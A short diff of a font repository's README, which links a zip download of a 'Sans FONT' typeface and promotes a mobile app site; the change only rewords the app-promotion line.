@@ -1,7 +1,7 @@
 # Sans FONT Typeface (3 fonts)
 <b>Welcome!</b> <br>
 This is my fresh take on <a href="https://github.com/qp5/FONT/raw/main/FONT.zip">Sans font🡇</a> typeset. <br>
-I've also recently launched <a href="https://bowHip.org">bowHip.org</a> mobile App.<br>
+recently launched <a href="https://bowHip.org">bowHip.org</a> mobile App.<br>
 
 FONT — Sans Typeface.
 Includes typeset 'FONT' plus 2 bonus fonts.<br>
